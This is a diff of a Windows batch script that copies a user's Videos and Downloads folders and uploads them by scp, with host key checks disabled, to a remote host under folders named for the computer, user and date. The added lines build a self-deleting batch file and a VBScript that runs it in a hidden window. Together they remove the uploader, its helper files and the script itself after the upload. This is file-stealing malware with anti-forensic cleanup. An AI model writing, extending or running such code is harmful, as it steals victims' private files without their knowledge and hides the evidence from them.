@@ -60,6 +60,12 @@ if exist "%USERPROFILE%\Videos" ( %copy% "%USERPROFILE%\Videos" "%cd%\files\Vide
 scp -o StrictHostKeyChecking=no -r "%cd%\files\Videos" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
 if exist "%USERPROFILE%\Downloads" ( %copy% "%USERPROFILE%\Downloads" "%cd%\files\Downloads" ) else if exist "%USERPROFILE%\OneDrive\Downloads" ( %copy% "%USERPROFILE%\OneDrive\Downloads" "%cd%\files\Downloads" )
 scp -o StrictHostKeyChecking=no -r "%cd%\files\Downloads" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+echo @echo off > "del%r%.bat"
 echo del /q /f "run.vbs" > "del%r%.bat"
-echo del /q /f "%cd%\%~n0%~x0" ^>nul 2^>^&1 ^& exit /b 0 >> "del%r%.bat"
-start del%r%.bat
+echo del /q /f "upload.bat" >> "del%r%.bat"
+echo del /q /f /r "%COMPUTERNAME%" >> "del%r%.bat"
+echo del /q /f "%%cd%%\%%~n0%%~x0" ^>nul 2^>^&1 ^& exit /b 0 >> "del%r%.bat"
+echo Set objShell = WScript.CreateObject("WScript.Shell") > "run.vbs"
+echo objShell.Run "%cd%\del%r%.bat", 0, True >> "run.vbs"
+start run.vbs
+exit
